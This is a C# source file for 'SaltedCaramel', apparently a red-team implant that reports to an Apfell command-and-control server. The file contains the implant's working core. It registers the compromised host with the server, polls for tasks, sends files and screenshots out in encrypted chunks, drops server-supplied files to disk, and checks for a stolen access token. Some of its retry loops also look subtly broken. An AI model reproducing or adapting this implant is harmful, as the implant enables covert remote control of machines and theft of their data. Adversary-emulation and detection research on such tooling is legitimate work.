using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace SaltedCaramel
{
    internal class CallbackResponse
    {
        public string status { get; set; }
        public string id { get; set; }
        // public int integrity { get; set; }
    }

    internal class TaskResponse
    {
        public string response { get; set; }
        public string id { get; set; }

        public TaskResponse(string response, string id)
        {
            this.response = System.Convert.ToBase64String(
                Encoding.UTF8.GetBytes(response)
            );
            this.id = id;
        }
    }

    /// <summary>
    /// Class for the response we get when downloading a file
    /// </summary>
    internal class DownloadResponse
    {
        public string file_id { get; set; }
    }

    internal class FileChunk
    {
        public int chunk_num { get; set; }
        public string file_id { get; set; }
        public string chunk_data { get; set; }
    }

    /// <summary>
    /// This class contains all methods used by the CaramelImplant
    /// </summary>
    internal class SaltedCaramelImplant
    {
        public string callbackId { get; set; }
        public string endpoint { get; set; }
        public string host { get; set; }
        public string ip { get; set; }
        public int pid { get; set; }
        public int sleep { get; set; }
        public string user { get; set; }
        public string uuid { get; set; }
        public string domain { get; set; }
        public string os { get; set; }
        public string architecture { get; set; }
        private int retry { get; set; }
        internal byte[] PSK { get; set; }
        private SaltedCaramelCrypto crypto = new SaltedCaramelCrypto();

        /// <summary>
        /// Post a response to the Apfell endpoint
        /// </summary>
        /// <param name="taskresp">The response to post to the endpoint</param>
        /// <returns>String with the Apfell server's reply</returns>
        public string PostResponse(TaskResponse taskresp)
        {
            string endpoint = this.endpoint + "responses/" + taskresp.id;
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(endpoint);
                request.Method = "POST";
                string json = JsonConvert.SerializeObject(taskresp);

                // Encrypt json to send to server
                string encrypted = crypto.Encrypt(json);

                byte[] reqPayload = Encoding.UTF8.GetBytes(encrypted);
                request.ContentLength = reqPayload.Length;

                Stream rqstream = request.GetRequestStream();
                rqstream.Write(reqPayload, 0, reqPayload.Length);
                rqstream.Close();

                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (Stream stream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(stream))
                {
                    string result = crypto.Decrypt(reader.ReadToEnd());
                    Debug.WriteLine($"[-] Got response for task {taskresp.id}: {result}");
                    if (result.Contains("success"))
                    {
                        // If it was successful, return the result
                        return result;
                    }
                    else
                    {
                        // If we didn't get success, retry and increment counter
                        while (retry < 20)
                        {
                            Debug.WriteLine($"[!] ERROR: Unable to post task response for {taskresp.id}, retrying...");
                            Thread.Sleep(this.sleep);
                            this.PostResponse(taskresp);
                        }
                        retry++;
                        throw (new Exception("[!] ERROR: Retries exceeded"));
                    }
                }
            }
            catch (Exception e)
            {
                return e.Message;
            }

        }

        public void SendComplete(string taskId)
        {
            Debug.WriteLine($"[+] Sending task complete for {taskId}");
            TaskResponse completeResponse = new TaskResponse("{\"completed\": true}", taskId);
            this.PostResponse(completeResponse);
        }

        public void SendError(string taskId, string error)
        {
            Debug.WriteLine($"[+] Sending error for {taskId}: {error}");
            TaskResponse errorResponse = new TaskResponse("{\"completed\": true, \"status\": \"error\", \"user_output\": \"" + error + "\"}", taskId);
            this.PostResponse(errorResponse);
        }

        /// <summary>
        /// Send a file to the Apfell server
        /// </summary>
        /// <param name="taskId">The task ID for the file download</param>
        /// <param name="filepath">The file path to download</param>
        public void SendFile(string taskId, string filepath)
        {
            try
            {
                // Get file info to determine file size
                FileInfo fileInfo = new FileInfo(filepath);
                long size = fileInfo.Length;
                Debug.WriteLine($"[+] DOWNLOADING: {filepath}, {size} bytes");

                // Determine number of 512kb chunks to send
                long total_chunks = size / 512000;
                // HACK: Dumb workaround because longs don't have a ceiling operation
                if (total_chunks == 0)
                    total_chunks = 1;
                Debug.WriteLine($"[+] File size = {size} ({total_chunks} chunks)");

                // Send number of chunks associated with task to Apfell server
                TaskResponse initial = new TaskResponse("{\"total_chunks\": " + total_chunks + ", \"task\": \"" + taskId + "\"}", taskId);
                DownloadResponse reply = JsonConvert.DeserializeObject<DownloadResponse>(PostResponse(initial));
                Debug.WriteLine($"[-] Received reply, file ID: " + reply.file_id);


                // Send file in chunks
                for (int i = 0; i < total_chunks; i++)
                {
                    byte[] chunk = null;
                    long pos = i * 512000;


                    // We need to use a FileStream in case our file size in bytes is larger than an Int32
                    // With a filestream, we can specify a position as a long, and then use Read() normally
                    using (FileStream fs = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        fs.Position = pos;

                        // If this is the last chunk, size will be the remaining bytes
                        if (i == total_chunks - 1)
                        {
                            chunk = new byte[size - (i * 512000)];
                            int chunkSize = chunk.Length;
                            fs.Read(chunk, 0, chunkSize);
                        }
                        // Otherwise we'll read 512kb from the file
                        else
                        {
                            chunk = new byte[512000];
                            fs.Read(chunk, 0, 512000);
                        }
                    }

                    // Convert chunk to base64 blob and create our FileChunk
                    FileChunk fc = new FileChunk();
                    fc.chunk_num = i;
                    fc.file_id = reply.file_id;
                    fc.chunk_data = Convert.ToBase64String(chunk);

                    // Send our FileChunk to Apfell server
                    TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(fc), taskId);
                    Debug.WriteLine($"[+] CHUNK SENT: {fc.chunk_num}");
                    Debug.WriteLine($"[-] RESPONSE: {this.PostResponse(response)}");
                    // Make sure we respect the sleep setting
                    Thread.Sleep(this.sleep);
                }


                // Tell the Apfell server file transfer is done
                this.SendComplete(taskId);
                Debug.WriteLine($"[+] File transfer complete: {filepath}");
            }
            catch (Exception e)
            {
                // Something failed, so we need to tell the server about it
                this.SendError(taskId, e.Message);
                Debug.WriteLine($"[!] ERROR: {e.Message}");
            }
        }

        public void SendScreenshot(string taskId, byte[] screenshot)
        {
            try
            {
                TaskResponse initial = new TaskResponse("{\"total_chunks\": " + 1 + ", \"task\":\"" + taskId + "\"}", taskId);
                DownloadResponse reply = JsonConvert.DeserializeObject<DownloadResponse>(PostResponse(initial));
                Debug.WriteLine($"[-] Received reply, file ID: " + reply.file_id);

                // Convert chunk to base64 blob and create our FileChunk
                FileChunk fc = new FileChunk();
                fc.chunk_num = 1;
                fc.file_id = reply.file_id;
                fc.chunk_data = Convert.ToBase64String(screenshot);

                // Send our FileChunk to Apfell server
                TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(fc), taskId);
                Debug.WriteLine($"[+] CHUNK SENT: {fc.chunk_num}");
                Debug.WriteLine($"[-] RESPONSE: {this.PostResponse(response)}");

                // Tell the Apfell server file transfer is done
                this.SendComplete(taskId);
            }
            catch (Exception e)
            {
                // Something failed, so we need to tell the server about it
                this.SendError(taskId, e.Message);
                Debug.WriteLine($"[!] ERROR: {e.Message}");
            }
        }

        /// <summary>
        /// Download file from Apfell controller to implant
        /// </summary>
        /// <param name="file_id">The file ID to download.</param>
        /// <param name="filepath">The path to drop the file on disk.</param>
        /// <param name="taskId">The task ID associated with this task.</param>
        public void GetFile(string file_id, string filepath, string taskId)
        {
            string endpoint = this.endpoint + "files/callback/" + this.callbackId;
            try
            {
                // POST file_id to Apfell server
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(endpoint);
                request.Method = "POST";

                string json = "{\"file_id\": \"" + file_id + "\"}";
                // Encrypt json to send to server
                string encrypted = crypto.Encrypt(json);

                byte[] reqPayload = Encoding.UTF8.GetBytes(encrypted);
                request.ContentLength = reqPayload.Length;

                Stream rqstream = request.GetRequestStream();
                rqstream.Write(reqPayload, 0, reqPayload.Length);
                rqstream.Close();

                using (HttpWebResponse webResponse = (HttpWebResponse)request.GetResponse())
                using (Stream stream = webResponse.GetResponseStream())
                using (StreamReader reader = new StreamReader(stream))
                {
                    string result = crypto.Decrypt(reader.ReadToEnd());
                    byte[] output = Convert.FromBase64String(result);
                    try
                    {
                        // Write file to disk
                        File.WriteAllBytes(filepath, output);
                        this.SendComplete(taskId);
                    }
                    catch (Exception e)
                    {
                        // Something failed, so we need to tell the server about it
                        this.SendError(taskId, e.Message);
                        Debug.WriteLine("[!] ERROR: " + e.Message);
                    }
                }
            }
            catch (Exception e)
            {
                // Something failed, so we need to tell the server about it
                this.SendError(taskId, e.Message);
                Debug.WriteLine("[!] ERROR: " + e.Message);
            }
        }

        /// <summary>
        /// Send initial implant callback, different from normal task response
        /// because we need the implant ID
        /// </summary>
        public void InitializeImplant()
        {
            string endpoint = this.endpoint + "crypto/aes_psk/" + this.uuid;
            this.retry = 0;

            crypto.PSK = this.PSK;
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(endpoint);
                request.Method = "POST";

                // Get JSON string for implant
                // Format: {"user":"username", "host":"hostname", "pid":<pid>, "ip":<ip>, "uuid":<uuid>}
                string json = JsonConvert.SerializeObject(this);
                Debug.WriteLine($"[+] INITIALIZING: Sending {json} to {endpoint}");

                // Encrypt json to send to server
                string encrypted = crypto.Encrypt(json);

                byte[] reqPayload = Encoding.UTF8.GetBytes(encrypted);
                request.ContentType = "text/plain";
                request.ContentLength = reqPayload.Length;

                // Send bytes to endpoint
                Stream rqstream = request.GetRequestStream();
                rqstream.Write(reqPayload, 0, reqPayload.Length);
                rqstream.Close();

                // Read response from endpoint
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (Stream stream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(stream))
                {
                    string result = crypto.Decrypt(reader.ReadToEnd());

                    if (result.Contains("success"))
                    {
                        // If it was successful, initialize implant
                        // Response is { "status": "success", "id": <id> }
                        CallbackResponse resultJSON = JsonConvert.DeserializeObject<CallbackResponse>(result);
                        this.callbackId = resultJSON.id;
                        Debug.WriteLine($"[-] INITIALIZE RESPONSE: {resultJSON.status}");
                        Debug.WriteLine($"[-] - Callback ID is: {this.callbackId}");
                        retry = 0;
                        return;
                    }
                    else
                    {
                        // If we didn't get success, retry and increment counter
                        while (retry < 20)
                        {
                            Debug.WriteLine("[!] ERROR: Unable to initialize implant, retrying...");
                            Thread.Sleep(this.sleep);
                            this.InitializeImplant();
                        }
                        retry++;
                        throw (new Exception("[!] ERROR: Retries exceeded when initializing implant"));
                    }
                }
            }
            catch (Exception e)
            {
                Debug.WriteLine(e.Message);
            }
        }

        /// <summary>
        /// Check Apfell endpoint for new task
        /// </summary>
        /// <returns>CaramelTask with the next task to execute</returns>
        public SaltedCaramelTask CheckTasking()
        {
            string taskEndpoint = this.endpoint + "tasks/callback/" + this.callbackId + "/nextTask";
            try
            {
                while (retry < 20)
                {
                    try
                    {
                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(taskEndpoint);

                        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                        using (Stream stream = response.GetResponseStream())
                        using (StreamReader reader = new StreamReader(stream))
                        {
                            SaltedCaramelTask task = JsonConvert.DeserializeObject<SaltedCaramelTask>(crypto.Decrypt(reader.ReadToEnd()));
                            retry = 0;
                            if (task.command != "none")
                                Debug.WriteLine("[-] NEW TASK with ID: " + task.id);
                            return task;
                        }
                    }
                    catch (Exception e)
                    {
                        retry++;
                        Debug.WriteLine("[!] ERROR: " + e.Message + ", retrying...");
                        Thread.Sleep(this.sleep);
                        this.CheckTasking();
                    }
                }
                throw new Exception();
            }
            catch
            {
                Debug.WriteLine("[!] CheckTasking failed, retries exceeded.");
                return null;
            }
        }

        public bool hasAlternateToken()
        {
            if (Token.stolenHandle != IntPtr.Zero)
            {
                return true;
            }
            else return false;
        }
    }
}
